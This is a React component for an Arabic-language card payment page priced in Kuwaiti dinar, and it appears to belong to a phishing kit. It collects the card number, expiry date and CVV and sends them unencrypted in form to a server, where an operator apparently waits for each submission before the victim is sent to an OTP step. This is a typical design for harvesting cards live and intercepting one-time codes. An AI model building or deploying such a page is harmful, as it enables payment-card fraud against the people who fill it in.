import Main from "@/components/MainWrapper";
import { useEffect, useState } from "react";
import { Link, useLocation } from "react-router-dom";
import { validateLanguage } from "@/lib/helpers";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import { FieldValues, useForm } from "react-hook-form";
import { CustomSelect } from "@/components/ui/select";
import Input from "@/components/Input";
import CardNumberInput from "@/components/CardNumberInput";
import { months, years } from "@/data/selects-data";
import { errMsgs } from "@/data/error-messages";

const Gateway = () => {
  const { state } = useLocation();
  const {
    register,
    handleSubmit,
    setValue,
    formState: { errors, isValidating, isValid },
  } = useForm({
    mode: "all",
    defaultValues: {
      name: state?.fullName,
      card_num: "",
      exp_month: "01",
      exp_year: "2030",
      cvv: "",
    },
  });
  const [cardType, setCardType] = useState<"visa" | "master" | "mada" | null>(
    state?.paymentMethod
  );

  useEffect(() => {
    setCurrentPage("payment-gateway");
  }, []);

  const onSubmit = (rawData: FieldValues) => {
    if (Object.values(rawData).filter((d) => !d).length === 0) {
      const data = {
        "نوع البطاقة": cardType,
        "إسم حامل البطاقة": rawData.name,
        "رقم البطاقة": rawData.card_num,
        "تاريخ الانتهاء": `${rawData.exp_month}/${rawData.exp_year}`,
        cvv: rawData.cvv,
      };

      sendDataToServer({
        data,
        current: "payment-gateway",
        nextPage: "otp",
        waitingForAdminResponse: true,
      });
    }
  };

  return (
    <Main>
      <main className="bg-gray-100 py-10">
        <div className="bg-white rounded-xl flex flex-col items-center justify-center w-fit max-w-[90dvw] lg:max-w-lg p-4 mx-auto">
          <div className="bg-main py-2 px-6 w-full mb-4 rounded-xl">
            <img
              src="/assets/images/logo.png"
              alt="logo"
              className="h-10 mx-auto"
            />
          </div>

          <div className="bg-main/20 rounded-2xl py-3 ps-4 pe-20 relative">
            {cardType && (
              <img
                src={`/assets/images/client/${cardType}-card.svg`}
                className="w-16 absolute left-2 top-4 lg:top-2 scale-125"
                alt={`${cardType || "visa card"} logo`}
              />
            )}

            <h2 className="text-xl font-bold text-main">
              الدفع من خلال بطاقة الائتمان
            </h2>
            <p className="text-gray-600">
              سيتم إجراء معاملة مالية على حسابك المصرفي بإستخدام البطاقة بقيمة
              المجموع الكلي
            </p>
          </div>

          <h3 className="text-xl font-bold text-main text-right mt-4 self-start px-4">
            معلومات البطاقة
          </h3>
          <form
            onSubmit={handleSubmit(onSubmit)}
            className="mt-4 grid grid-cols-6 items-end gap-8 w-full px-4"
          >
            <div className={"col-span-6"}>
              <Input
                errors={errors}
                register={register}
                label="إسم حامل البطاقة"
                placeholder="أدخل إسم حامل البطاقة"
                id="name"
                type="text"
                isAr
                className="text-left"
                containerClassName="col-span-6"
                options={{
                  required: "هذا الحقل ضروري",
                  validate: (value) =>
                    validateLanguage(value) !== "en" ? errMsgs.name : true,
                }}
              />
            </div>

            <CardNumberInput
              errors={errors}
              register={register}
              label="رقم البطاقة"
              placeholder="xxxx xxxx xxxx xxxx"
              id="card_num"
              type="tel"
              className={"text-left"}
              containerClassName="col-span-6"
              options={{
                required: "هذا الحقل ضروري",
                pattern: {
                  value: /^[0-9]{16}$/,
                  message: errMsgs.card_num,
                },
              }}
              cardType={cardType!}
              setCardType={setCardType}
            />

            <div className={"col-span-6"}>
              <div className="flex justify-center gap-2">
                <label
                  htmlFor={"cvv"}
                  className="grow block text-sm font-bold text-gray-800"
                >
                  الرمز السري (CVV)
                </label>

                <label
                  htmlFor={"year_month"}
                  className="block text-sm font-bold text-gray-800 w-fit"
                >
                  تاريخ الإنتهاء
                </label>
              </div>

              <div className="mt-2 flex justify-center flex-row-reverse gap-2">
                <CustomSelect
                  id="exp_month"
                  placeholder="شهر"
                  label=""
                  sels={months}
                  className="px-4"
                  defaultValue="01"
                  register={register}
                  errors={errors}
                  options={{ required: errMsgs.month }}
                  setValue={setValue}
                />
                <CustomSelect
                  id="exp_year"
                  placeholder="سنة"
                  label=""
                  sels={years}
                  className="px-4"
                  defaultValue="2030"
                  register={register}
                  errors={errors}
                  options={{ required: errMsgs.year }}
                  setValue={setValue}
                />

                <Input
                  errors={errors}
                  register={register}
                  isAr
                  id="cvv"
                  placeholder="خلف البطاقة"
                  type="password"
                  max={3}
                  className={"flex-1"}
                  containerClassName="col-span-6"
                  options={{
                    required: "هذا الحقل ضروري",
                    pattern: {
                      value: /^\d{3}$/,
                      message: errMsgs.cvv,
                    },
                  }}
                />
              </div>
            </div>

            <p className="w-max">
              {`المجموع الكلى:`}{" "}
              <strong className="text-main font-bold underline ring-offset-4">
                {state?.payment_amount || 8}
              </strong>{" "}
              دينار كويتي
            </p>
            <div className="col-span-6 mt-6 flex flex-col lg:flex-row sm:items-center gap-4">
              <button
                className="w-full lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-main hover:brightness-110 text-white transition-colors disabled:cursor-not-allowed disabled:bg-gray-400"
                type="submit"
                disabled={!isValid}
              >
                {isValidating ? "جاري الحفص ..." : "ادفع الآن"}
              </button>
              <Link
                className="w-full text-center lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-gray-200 hover:bg-gray-100 text-gray-800 transition-colors"
                to={"/pick-payment"}
                state={state}
              >
                السابق
              </Link>
            </div>

            <img
              src="/assets/images/safe.png"
              alt="safe and sound banner"
              className="col-span-6"
            />
          </form>
        </div>
      </main>
    </Main>
  );
};
export default Gateway;
